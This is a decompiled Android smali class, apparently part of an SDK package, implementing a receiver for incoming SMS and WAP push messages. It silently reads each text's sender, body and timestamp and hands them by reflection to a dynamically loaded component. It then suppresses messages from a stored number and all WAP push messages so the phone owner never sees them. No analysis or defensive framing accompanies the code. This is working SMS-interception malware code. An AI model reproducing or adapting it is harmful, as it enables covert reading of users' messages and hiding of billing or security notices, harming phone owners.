.class public Lcom/xxsw/sdk/dsms;
.super Landroid/content/BroadcastReceiver;
.source "dsms.java"


# static fields
.field public static final MMS_ACTION:Ljava/lang/String; = "android.provider.Telephony.WAP_PUSH_RECEIVED"

.field public static final SMS_ACTION:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 12
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 15
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 18
    :try_start_0
    invoke-static/range {p1 .. p1}, Lcom/xxsw/sdk/dswc;->start(Landroid/content/Context;)Ljava/lang/Boolean;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v8

    if-eqz v8, :cond_1

    .line 72
    :cond_0
    :goto_0
    return-void

    .line 23
    :catch_0
    move-exception v8

    .line 29
    :cond_1
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 31
    .local v0, "action":Ljava/lang/String;
    :try_start_1
    const-string v8, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v8, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_5

    .line 32
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 33
    .local v1, "bundle":Landroid/os/Bundle;
    if-eqz v1, :cond_0

    .line 34
    const-string v8, "pdus"

    invoke-virtual {v1, v8}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, [Ljava/lang/Object;

    .line 35
    .local v6, "pdus":[Ljava/lang/Object;
    array-length v9, v6

    const/4 v8, 0x0

    :goto_1
    if-ge v8, v9, :cond_0

    aget-object v5, v6, v8

    .line 36
    .local v5, "pdu":Ljava/lang/Object;
    check-cast v5, [B

    .end local v5    # "pdu":Ljava/lang/Object;
    invoke-static {v5}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v2

    .line 37
    .local v2, "message":Landroid/telephony/SmsMessage;
    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v7

    .line 38
    .local v7, "sender":Ljava/lang/String;
    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    .line 39
    .local v4, "msg":Ljava/lang/String;
    const-string v10, "+86"

    invoke-virtual {v7, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_2

    .line 40
    const/4 v10, 0x3

    invoke-virtual {v7, v10}, Ljava/lang/String;->substring(I)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v7

    .line 44
    :cond_2
    :try_start_2
    sget-object v10, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    if-eqz v10, :cond_3

    sget-object v10, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    if-eqz v10, :cond_3

    .line 45
    sget-object v10, Lcom/xxsw/sdk/dswc;->cClass:Ljava/lang/Class;

    const-string v11, "sms"

    const/4 v12, 0x4

    new-array v12, v12, [Ljava/lang/Class;

    const/4 v13, 0x0

    const-class v14, Ljava/lang/String;

    aput-object v14, v12, v13

    const/4 v13, 0x1

    const-class v14, Ljava/lang/String;

    aput-object v14, v12, v13

    const/4 v13, 0x2

    sget-object v14, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v14, v12, v13

    const/4 v13, 0x3

    sget-object v14, Ljava/lang/Long;->TYPE:Ljava/lang/Class;

    aput-object v14, v12, v13

    invoke-virtual {v10, v11, v12}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    .line 46
    .local v3, "method":Ljava/lang/reflect/Method;
    sget-object v10, Lcom/xxsw/sdk/dswc;->coreAPP:Ljava/lang/Object;

    const/4 v11, 0x4

    new-array v11, v11, [Ljava/lang/Object;

    const/4 v12, 0x0

    new-instance v13, Ljava/lang/String;

    invoke-direct {v13, v7}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    aput-object v13, v11, v12

    const/4 v12, 0x1

    new-instance v13, Ljava/lang/String;

    invoke-direct {v13, v4}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    aput-object v13, v11, v12

    const/4 v12, 0x2

    const/4 v13, 0x1

    invoke-static {v13}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    aput-object v13, v11, v12

    const/4 v12, 0x3

    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v13

    invoke-static {v13, v14}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v13

    aput-object v13, v11, v12

    invoke-virtual {v3, v10, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 48
    .end local v3    # "method":Ljava/lang/reflect/Method;
    :cond_3
    sget-object v10, Lcom/xxsw/sdk/dswc;->b_phone:Ljava/lang/String;

    invoke-virtual {v7, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v10

    if-nez v10, :cond_4

    .line 49
    invoke-virtual {p0}, Lcom/xxsw/sdk/dsms;->abortBroadcast()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 35
    :cond_4
    :goto_2
    add-int/lit8 v8, v8, 0x1

    goto :goto_1

    .line 59
    .end local v1    # "bundle":Landroid/os/Bundle;
    .end local v2    # "message":Landroid/telephony/SmsMessage;
    .end local v4    # "msg":Ljava/lang/String;
    .end local v6    # "pdus":[Ljava/lang/Object;
    .end local v7    # "sender":Ljava/lang/String;
    :cond_5
    :try_start_3
    const-string v8, "android.provider.Telephony.WAP_PUSH_RECEIVED"

    invoke-virtual {v8, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 61
    invoke-virtual {p0}, Lcom/xxsw/sdk/dsms;->abortBroadcast()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_0

    .line 68
    :catch_1
    move-exception v8

    goto/16 :goto_0

    .line 53
    .restart local v1    # "bundle":Landroid/os/Bundle;
    .restart local v2    # "message":Landroid/telephony/SmsMessage;
    .restart local v4    # "msg":Ljava/lang/String;
    .restart local v6    # "pdus":[Ljava/lang/Object;
    .restart local v7    # "sender":Ljava/lang/String;
    :catch_2
    move-exception v10

    goto :goto_2
.end method
